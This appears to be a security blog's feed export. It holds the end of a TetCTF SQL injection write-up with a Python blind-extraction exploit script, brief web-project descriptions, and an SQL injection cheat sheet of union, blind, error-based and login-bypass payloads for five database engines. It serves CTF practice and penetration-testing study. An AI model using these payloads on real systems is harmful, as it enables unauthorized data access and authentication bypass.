mysqli_query(<span class="variable">$conn</span>,<span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$run_query</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> mysqli_error(<span class="variable">$conn</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;    </span><br><span class="line">            <span class="comment">// I&#x27;m kidding, just the name of flag, not flag :(</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$res</span> = <span class="variable">$run_query</span>-&gt;fetch_array()[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$res</span>; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>일단 preg_match() 함수를 이용해서 수 많은 키워드를 필터링하고 있는 것을 볼 수 있습니다. 그리고 id 값이 1일때, 2일때의 출력값이 다르므로 Blind Based SQL Injection을 이용해 <code>flag</code>를 뽑아야겠다 생각이 들었습니다.</strong><br><br></p><p><strong>하지만 <code>culumn</code>이라는 키워드가 필터링이 걸려 있어 <code>flag</code>가 들어있는 컬럼을 Blind Based SQL Injection을 이용해서 뽑아올 수 없을 거 같다는 생각이 들었습니다. 왜냐하면 <code>information_schema.columns</code>라는 메타 테이블에서 <code>column_name</code>을 조회해야 하는데 필터링에 때문에 불가능하기 때문입니다.</strong><br><br></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202021-01-03%20%EC%98%A4%ED%9B%84%206.51.35.png?raw=true"><br><br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202021-01-03%20%EC%98%A4%ED%9B%84%206.56.37.png?raw=true"></p><p><strong>그러다가 N1 CTF에서 <code>exp()</code> 함수를 이용해서 Error Based Blind SQL Injection을 이용한 적이 있어서 위와 같이 MySQL의 <code>exp()</code>함수를 이용해서 <code>Overflow</code>를 일으켜 에러에 내가 원하는 값(Column Name)을 포함시키는 방식으로 해결하려 했지만 <code>exp()</code> 함수를 필터링하고 있었습니다. 아마 이 방법을 못 쓰게 방지한 거 같습니다. 그래서 그냥 새해니 쉴려고 접고, 롤을 했었습니다. 그러다 오늘 아침에 다시 확인을 해보니 <code>exp()</code> 함수 대신 <code>pow()</code> 함수를 이용해도 잘 되는 것을 확인할 수 있었습니다.</strong></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202021-01-03%20%EC%98%A4%ED%9B%84%207.01.29.png?raw=true"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pow(<span class="operator">~</span>(<span class="keyword">select</span> id <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag_here_hihi limit <span class="number">0</span>,<span class="number">1</span>) <span class="keyword">as</span> id),<span class="number">9999</span>)</span><br></pre></td></tr></table></figure><p><strong>그래서 위 페이로드를 id 값으로 넘겨주니 에러에 컬럼 이름들이 포함되어 있는 것을 확인할 수 있었고, <code>t_fl4g_v3lue_su</code>라는 컬럼이 존재하는 것을 알 수 있었습니다.  이제 해당 컬럼의 값을 Blind Based SQL Injection을 이용해서 뽑아내면 GG</strong><br><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://45.77.255.164/?id=&quot;</span></span><br><span class="line">flag_len, flag = <span class="number">0</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Flag_len</span>():</span></span><br><span class="line"><span class="keyword">global</span> flag_len</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">payload = <span class="string">&quot;length(t_fl4g_v3lue_su)in(&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">URL = url + payload</span><br><span class="line">res = requests.get(URL)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;handsome_flag&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">flag_len = i</span><br><span class="line">print(<span class="string">&quot;[+] Flag Length is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Flag</span>():</span></span><br><span class="line"><span class="keyword">global</span> flag</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, flag_len + <span class="number">1</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">35</span>, <span class="number">126</span>):</span><br><span class="line">payload = <span class="string">&quot;ascii(right(left(t_fl4g_v3lue_su,&#123;&#125;),1))in(&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(i, j)</span><br><span class="line">URL = url + payload</span><br><span class="line">res = requests.get(URL)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;handsome_flag&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">flag += <span class="built_in">chr</span>(j)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">print(<span class="string">&quot;Flag is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">print(<span class="string">&quot;[+] Exploitation ...&quot;</span>)</span><br><span class="line">Flag_len()</span><br><span class="line">Flag()</span><br></pre></td></tr></table></figure><p><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202021-01-03%20%EC%98%A4%ED%9B%84%208.20.53.png?raw=true"></p><p><strong>위와 같이 익스플로잇 코드를 작성하고 돌려주니 flag가 잘 나오는 것을 볼 수 있습니다.</strong><br></p><p><code>FLAG : TetCTF&#123;_W3LlLlLlll_Pl44yYyYyyYY_&lt;3_vina_*100*28904961445554#&#125;</code></p><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL Injecion </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web Project (flask)</title>
      <link href="2021/01/03/2021-01-03-Project-4/"/>
      <url>2021/01/03/2021-01-03-Project-4/</url>
      
        <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description "></a>Description <br></h1><p><strong>2020년에는 중국 우한에서 COVID-19라는 바이러스가 생겼습니다. 그래서 COVID-19 백신샵을 배경으로 서비스를 개발하고, 진단, 시큐어 코딩, 보고서 작성으로 진행하는 프로젝트입니다.</strong><br></p><hr><h2 id="Things-used"><a href="#Things-used" class="headerlink" title="Things used"></a>Things used<br></h2><p>Language&nbsp;&nbsp;&nbsp;<code>HTML</code>, <code>python</code>, <code>javascript</code><br><br>Database&nbsp;&nbsp;&nbsp;&nbsp;<code>MySQL</code><br><br>WF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>flask</code><br><br>OS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>Mac</code><br></p><hr><h2 id="Project-Member"><a href="#Project-Member" class="headerlink" title="Project Member"></a>Project Member<br></h2><p>Jeongwon Jo (Captain)</p><hr><h2 id="Project-period"><a href="#Project-period" class="headerlink" title="Project period"></a>Project period<br></h2><p>undefined<br></p><hr><h2 id="Web-Service-Source-Code"><a href="#Web-Service-Source-Code" class="headerlink" title="Web Service Source Code"></a>Web Service Source Code</h2><p><a href="https://github.com/wjddnjs33/Falsk_Project/tree/main/Flask_Porject">SOURCE</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> Project </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Project </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL Injection Summary</title>
      <link href="2021/01/02/2021-01-02-SQL-Injection-Summary/"/>
      <url>2021/01/02/2021-01-02-SQL-Injection-Summary/</url>
      
        <content type="html"><![CDATA[<p>Solving the Bug Bounty and CTF challenge, sometimes you need to use SQL Injection attacks. So this time, let’s write the attack techniques and bypass techniques for each trick.<br></p><hr><h2 id="Comment"><a href="#Comment" class="headerlink" title="Comment"></a>Comment</h2><p><b><em><span style="color:#631F9C">&#62;</span> MySQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#35;<br><br><span style="color:#3E386D">→</span> &#47;&#42;&#42;&#47;<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> MsSQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#47;&#42;&#42;&#47;<br><br>   <span style="color:#3E386D">→</span> &#59;&#37;00<br><br><span style="color:#3E386D">→</span> &#8211;&#8211;&#43;<br><br><span style="color:#3E386D">→</span> &#8211;&#8211;&#43;&#8211;<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> Oracle</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#47;&#42;&#42;&#47;<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> SQLITE</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#47;&#42;&#42;&#47;<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> PgSQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#47;&#42;&#42;&#47;<br></p></blockquote><hr><h2 id="Version-Check"><a href="#Version-Check" class="headerlink" title="Version Check"></a>Version Check</h2><p><b><em><span style="color:#631F9C">&#62;</span> MySQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> version()<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> MsSQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> @@version<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> Oracle</em></b></p><blockquote><p><span style="color:#3E386D">→</span> select * from v$version<br><br><span style="color:#3E386D">→</span> select version from product_component_version<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> SQLITE</em></b></p><blockquote><p><span style="color:#3E386D">→</span> sqlite_version()<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> PgSQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> version()<br></p></blockquote><hr><h2 id="Union-Based-SQL-Injection"><a href="#Union-Based-SQL-Injection" class="headerlink" title="Union Based SQL Injection"></a>Union Based SQL Injection</h2><p><b><em><span style="color:#631F9C">&#62;</span> MySQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#39; union select null<br><br><span style="color:#3E386D">→</span> &#39; union select null, null<br><br><span style="color:#3E386D">→</span> &#39; union select null, null, null<br><br><span style="color:#3E386D">→</span> &#39; union select null, null, null, null<br><br>(If there is no error when sending 4 nulls as above, it means that 4 columns are being used.)<br></p></blockquote><blockquote><p><span style="color:#3E386D">→</span> &#39; order by 1<br><br><span style="color:#3E386D">→</span> &#39; order by 2<br><br><span style="color:#3E386D">→</span> &#39; order by 3<br><br><span style="color:#3E386D">→</span> &#39; order by 4<br><br><span style="color:#3E386D">→</span> &#39; order by N<br><br>(If an error occurs using <code>order by</code>, the number of columns in use is N-1.)<br></p></blockquote><blockquote><p><span style="color:#3E386D">→</span> &#39; union select database(), null, null, null<br><br><span style="color:#3E386D">→</span> &#39; union select group_concat(table_name), null, null, null from information_schema.tables<br><br><span style="color:#3E386D">→</span> &#39; union select group_concat(column_name), null, null, null from information_schema.columns<br><br><span style="color:#3E386D">→</span> &#39; union select group_concat(&#60;column_name&#62;), null, null, null from &#60;table_name&#62;<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> MsSQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#39; union select null<br><br><span style="color:#3E386D">→</span> &#39; union select null, null<br><br><span style="color:#3E386D">→</span> &#39; union select null, null, null<br><br><span style="color:#3E386D">→</span> &#39; union select null, null, null, null<br><br>(If there is no error when sending 4 nulls as above, it means that 4 columns are being used.)<br></p></blockquote><blockquote><p><span style="color:#3E386D">→</span> &#39; order by 1<br><br><span style="color:#3E386D">→</span> &#39; order by 2<br><br><span style="color:#3E386D">→</span> &#39; order by 3<br><br><span style="color:#3E386D">→</span> &#39; order by 4<br><br><span style="color:#3E386D">→</span> &#39; order by N<br><br>(If an error occurs using <code>order by</code>, the number of columns in use is N-1.)<br></p></blockquote><blockquote><p><span style="color:#3E386D">→</span> &#39; union select db_name(), null, null, null<br><br><span style="color:#3E386D">→</span> &#39; union select table_name, null, null, null from  (select top 1 table_name from information_schema.tables order by 1) as shit order by 1 desc<br><br><span style="color:#3E386D">→</span> &#39; union select table_name, null from  (select top 2 table_name from information_schema.tables order by 1) as shit order by 1 desc<br><br><span style="color:#3E386D">→</span> &#39; union select table_name, null from  (select top 3 table_name from information_schema.tables order by 1) as shit order by 1 desc<br><br><span style="color:#3E386D">→</span> &#39; union select table_name, null from  (select top 4 table_name from information_schema.tables order by 1) as shit order by 1 desc<br><br><span style="color:#3E386D">→</span> &#39; union select column_name, null from (select top 1 column_name from information_schema.columns where table_name=&#39;&#60;table_name&#62;&#39; order by 1) as shit order by 1 desc<br><br><span style="color:#3E386D">→</span> &#39; union select column_name, null, null, null from (select top 2 column_name from information_schema.columns where table_name=&#39;&#60;table_name&#62;&#39; order by 1) as shit order by 1 desc<br><br><span style="color:#3E386D">→</span> &#39; union select column_name, null, null, null from (select top 3 column_name from information_schema.columns where table_name=&#39;&#60;table_name&#62;&#39; order by 1) as shit order by 1 desc<br><br><span style="color:#3E386D">→</span> &#39; union select column_name, null, null, null from (select top 4 column_name from information_schema.columns where table_name=&#39;&#60;table_name&#62;&#39; order by 1) as shit order by 1 desc<br><br><span style="color:#3E386D">→</span> &#39; union select &#60;column_name&#62;, null, null, null from &#60;table_name&#62;<br></p></blockquote><blockquote><p><span style="color:#3E386D">→</span> &#39; union select string_agg(db_name(),&#39;,&#39;), null, null, null<br><br><span style="color:#3E386D">→</span> &#39; union select string_agg(table_name,&#39;,&#39;), null, null, null from information_schema.tables<br><br><span style="color:#3E386D">→</span> &#39;union select string_agg(column_name,&#39;,&#39;), null, null, null from information_schema.columns where table_name=’&#60;table_name&#62;’<br><br><span style="color:#3E386D">→</span> &#39; union select string_agg(&#60;column_name&#62;,&#39;,&#39;), null, null, null from &#60;table_name&#62;<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> Oracle</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#39; union select null from dual<br><br><span style="color:#3E386D">→</span> &#39; union select null, null from dual<br><br><span style="color:#3E386D">→</span> &#39; union select null, null, null from dual<br><br><span style="color:#3E386D">→</span> &#39; union select null, null, null, null from dual<br><br>(If there is no error when sending 4 nulls as above, it means that 4 columns are being used.)<br></p></blockquote><blockquote><p><span style="color:#3E386D">→</span> &#39; order by 1<br><br><span style="color:#3E386D">→</span> &#39; order by 2<br><br><span style="color:#3E386D">→</span> &#39; order by 3<br><br><span style="color:#3E386D">→</span> &#39; order by 4<br><br><span style="color:#3E386D">→</span> &#39; order by N<br><br>(If an error occurs using <code>order by</code>, the number of columns in use is N-1.)<br></p></blockquote><blockquote><p><span style="color:#3E386D">→</span> &#39; union select LISTAGG(table_name,&#39;,&#39;) WITHIN GROUP(ORDER BY table_name), null<br>FROM user_tables<br><br><span style="color:#3E386D">→</span> &#39; union select null, LISTAGG(column_name,&#39;,&#39;) WITHIN GROUP(ORDER BY column_name) from cols<br><br><span style="color:#3E386D">→</span> &#39; union select LISTAGG(&#60;column_name&#62;,&#39;,&#39;) WITHIN GROUP(ORDER BY &#60;column_name&#62;) AS result, null<br>FROM &#60;table_name&#62;<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> SQLITE</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#39; union select null<br><br><span style="color:#3E386D">→</span> &#39; union select null, null<br><br><span style="color:#3E386D">→</span> &#39; union select null, null, null<br><br><span style="color:#3E386D">→</span> &#39; union select null, null, null, null<br><br>(If there is no error when sending 4 nulls as above, it means that 4 columns are being used.)<br></p></blockquote><blockquote><p><span style="color:#3E386D">→</span> &#39; order by 1<br><br><span style="color:#3E386D">→</span> &#39; order by 2<br><br><span style="color:#3E386D">→</span> &#39; order by 3<br><br><span style="color:#3E386D">→</span> &#39; order by 4<br><br><span style="color:#3E386D">→</span> &#39; order by N<br><br>(If an error occurs using <code>order by</code>, the number of columns in use is N-1.)<br></p></blockquote><blockquote><p><span style="color:#3E386D">→</span> &#39; union select sqlite_version(), null, null, null<br><br><span style="color:#3E386D">→</span> &#39; union select group_concat(sql), group_concat(name), null, null from sqlite_master<br><br><span style="color:#3E386D">→</span> &#39; union select group_concat(&#60;column_name&#62;), group_concat(&#60;column_name&#62;), null, null from &#60;table_name&#62;<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> PgSQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#39; union select null<br><br><span style="color:#3E386D">→</span> &#39; union select null, null<br><br><span style="color:#3E386D">→</span> &#39; union select null, null, null<br><br><span style="color:#3E386D">→</span> &#39; union select null, null, null, null<br><br>(If there is no error when sending 4 nulls as above, it means that 4 columns are being used.)<br></p></blockquote><blockquote><p><span style="color:#3E386D">→</span> &#39; order by 1<br><br><span style="color:#3E386D">→</span> &#39; order by 2<br><br><span style="color:#3E386D">→</span> &#39; order by 3<br><br><span style="color:#3E386D">→</span> &#39; order by 4<br><br><span style="color:#3E386D">→</span> &#39; order by N<br><br>(If an error occurs using <code>order by</code>, the number of columns in use is N-1.)<br></p></blockquote><blockquote><p><span style="color:#3E386D">→</span> &#39; union select current_database(), null, null, null<br><br><span style="color:#3E386D">→</span> &#39; union select string_agg(table_name, &#39;,&#39;), null, null, null from information_schema.tables<br><br><span style="color:#3E386D">→</span> &#39; union select string_agg(column_name, &#39;,&#39;), null, null, null from information_schema.columns where table_name = &#60;table_name&#62;<br><br><span style="color:#3E386D">→</span> &#39; union select string_agg(&#60;column_name&#62;), null, null, null from &#60;table_name&#62;</p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> MsSQL</em></b></p><hr><h2 id="Boolean-Based-Blind-SQL-Injection"><a href="#Boolean-Based-Blind-SQL-Injection" class="headerlink" title="Boolean Based Blind SQL Injection"></a>Boolean Based Blind SQL Injection</h2><p><b><em><span style="color:#631F9C">&#62;</span> MySQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#39;or if(length(database())  &gt;N, 1, 0) &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or if(ascii(substr(database(),1,1)) &gt; N, 1, 0) &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or if((select count(table_name) from information_schema.tables) &gt; N, 1, 0)&#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or if((select ascii(substr(table_name,1,1)) from information_schema.tables) &gt; N, 1, 0) &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or if((select count(column_name) from information_schema.columns where table_name = &#60;table_name&#62;) &gt; N, 1, 0)&#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or if((select count(&#60;column_name&#62;) from &#60;table_name&#62;) &gt; N, 1, 0) &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or if((select length(&#60;column_name&#62;) from &#60;table_name&#62;) &gt; N, 1, 0) &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or if((select ascii(substr(&#60;column_name&#62;,1,1)) from &#60;table_name&#62;) &gt; N, 1, 0) &#8211;&#8211;<br></p></blockquote><hr><h2 id="Efficient-Blind-SQL-Injection"><a href="#Efficient-Blind-SQL-Injection" class="headerlink" title="Efficient Blind SQL Injection"></a>Efficient Blind SQL Injection</h2><p><b><em><span style="color:#631F9C">&#62;</span> MySQL</em></b></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;&#x27;</span></span><br><span class="line">condition result = <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">range</span>):</span><br><span class="line">  binary = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">9</span>):</span><br><span class="line">    query = <span class="string">&quot;&#x27;or substr(lpad(bin(ascii(substr(database(), i, 1))), 7, 0), j, 1)%23&quot;</span></span><br><span class="line">    res = requests.get(url + query)</span><br><span class="line">    <span class="keyword">if</span> condition <span class="keyword">in</span> res.text:</span><br><span class="line">      binary += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      binary += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">  result += <span class="built_in">chr</span>(<span class="built_in">int</span>(binary, <span class="number">2</span>))</span><br><span class="line">  </span><br><span class="line">print(<span class="string">&quot;[+] Result : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(result))</span><br></pre></td></tr></table></figure><hr><h2 id="Authentication-Bypass"><a href="#Authentication-Bypass" class="headerlink" title="Authentication Bypass"></a>Authentication Bypass</h2><p><b><em><span style="color:#631F9C">&#62;</span> MySQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#39;or 1=1 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1&gt;0 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1&lt;&gt;0 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1in(1) &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1 like 1 &#8211;&#8211;<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> MsSQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#39;or 1=1 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1&gt;0 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1&lt;&gt;0 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1in(1) &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1 like 1 &#8211;&#8211;<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> Oracle</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#39;or 1=1 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1&gt;0 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1&lt;&gt;0 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1 like 1 &#8211;&#8211;<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> SQLite</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#39;or 1=1 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1==1 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1in(1) &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1&gt;0 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1&lt;&gt;0 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1 like 1 &#8211;&#8211;-<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> PgSQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#39;or 1=1 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1in(1) &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1&gt;0 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1&lt;&gt;0 &#8211;&#8211;<br></p></blockquote><hr><h2 id="ETC"><a href="#ETC" class="headerlink" title="ETC"></a>ETC</h2><p><b><em><span style="color:#631F9C">&#62;</span> MySQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> pow(<del>(select &#60;column_name&#62; from (select * from &#60;table_name&#62; limit 0,1) as id), 9999)<br><span style="color:#3E386D">→</span> exp(</del>(select &#60;column_name&#62; from (select * from &#60;table_name&#62; limit 0,1) as a) * 9999)</p></blockquote><p><strong>Error Based SQL Injection이 가능하다면 위 페이로드를 이용해서 테이블의 존재하는 모든 칼럼을 에러에 포함시켜 출력시킬 수 있습니다. 대신 테이블 이름과 칼럼 이름을 하나 알고 있어야 합니다.</strong><br></p><blockquote><p><span style="color:#3E386D">→</span> select extractvalue(rand(),concat(0x3a,((select &#60;column_name&#62; from &#60;table_name&#62; limit 0, 1))))<br><strong>Error Based SQL Injection이 가능하다면 위 페이로드를 이용해서 컬럼 값을 에러에 포함시켜 출력시킬 수 있습니다.</strong></p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CheatSheet </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CheatSheet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web Project (Node)</title>
      <link href="2020/12/28/2020-12-28-Project-3/"/>
      <url>2020/12/28/2020-12-28-Project-3/</url>
      
        <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description "></a>Description <br></h1><p>This project is to build a web service and perform a penetration test on the built web service. After successfully completing this project, your development ability using Node.js and penetration testing of web services will grow.</p><hr><h2 id="Things-used"><a href="#Things-used" class="headerlink" title="Things used"></a>Things used<br></h2><p>Language&nbsp;&nbsp;&nbsp;<code>HTML</code>, <code>Javascript</code><br><br>Database&nbsp;&nbsp;&nbsp;<code>MySQL</code>, <code>Mongo DB</code><br><br>OS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>Ubuntu</code><br><br>WF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>Node.js</code></p><hr><h2 id="Project-Member"><a href="#Project-Member" class="headerlink" title="Project Member"></a>Project Member</h2><p><code>Jeongwon Jo (Captain)</code><br></p><hr><h2 id="Project-period"><a href="#Project-period" class="headerlink" title="Project period"></a>Project period<br></h2><p>2020.12.28 ~ 2021.02.12 (47 Day)</p><hr><h2 id="Project-summary"><a href="#Project-summary" class="headerlink" title="Project summary"></a>Project summary<br></h2><ol><li>Web Service Development ( SNS, HomeShoping )<br></li><li><a href="https://owasp.org/www-project-top-ten/">OWASP Top 10</a>-based diagnostics<br></li><li>Secure Coding<br></li><li>Report writing<br></li></ol><hr><h2 id="OWASP-TOP-10"><a href="#OWASP-TOP-10" class="headerlink" title="OWASP TOP 10"></a>OWASP TOP 10</h2><blockquote><ol><li>Injection</li><li>Broken Authentication</li><li>Sensitive Data Exposure</li><li>XXE</li><li>Broken Access Control</li><li>Security Misconfiguration</li><li>Cross-Site Scripting</li><li>Insecure Deserialization</li><li>Using Components with Known Vulnerabilities</li><li>Insufficient Logging &amp; Monitoring</li></ol></blockquote><hr><h2 id="Web-Service-Source-Code"><a href="#Web-Service-Source-Code" class="headerlink" title="Web Service Source Code"></a>Web Service Source Code<br></h2><p>Undefined</p><hr><h2 id="Project-Report"><a href="#Project-Report" class="headerlink" title="Project Report"></a>Project Report<br></h2><p>Undefined</p><hr>]]></content>
      
      
      <categories>
          
          <category> Project </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Project </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Zer0pts CTF 2020 Write Up</title>
      <link href="2020/12/26/2020-12-26-Zer0pts-CTF-2020/"/>
      <url>2020/12/26/2020-12-26-Zer0pts-CTF-2020/</url>
      
